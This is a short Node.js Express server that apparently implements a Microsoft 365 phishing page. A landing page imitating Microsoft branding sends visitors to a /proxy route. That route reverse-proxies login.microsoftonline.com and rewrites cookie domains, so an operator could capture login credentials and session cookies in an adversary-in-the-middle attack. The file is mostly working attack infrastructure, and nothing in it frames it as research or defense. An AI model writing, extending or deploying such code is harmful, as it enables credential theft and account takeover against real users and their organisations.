const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const app = express();
const PORT = process.env.PORT || 3000;

// Log that server is starting
console.log('🚀 Server starting...');

// Serve static files from 'public' folder
app.use(express.static('public'));

// ✅ THE PROXY ROUTE – THIS IS DEFINITELY HERE
app.use('/proxy', createProxyMiddleware({
  target: 'https://login.microsoftonline.com',
  changeOrigin: true,
  secure: true,
  cookieDomainRewrite: { '*': '' },
  onProxyReq: (proxyReq, req, res) => {
    console.log('🔄 PROXY REQUEST:', req.url);
  },
  onError: (err, req, res) => {
    console.error('❌ PROXY ERROR:', err.message);
    res.status(500).send('Proxy error');
  }
}));

// Landing page
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>Microsoft 365</title></head>
    <body style="font-family:'Segoe UI',sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;background:#f2f2f2;margin:0;">
      <div style="background:white;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);text-align:center;max-width:400px;">
        <h1>Microsoft 365</h1>
        <p>Secure access to your account</p>
        <a href="/proxy" style="display:inline-block;background:#0078d4;color:white;padding:12px 24px;border-radius:4px;text-decoration:none;font-weight:bold;margin-top:20px;">Continue to Microsoft 365</a>
      </div>
    </body>
    </html>
  `);
});

app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
  console.log(`✅ Proxy available at: /proxy`);
});
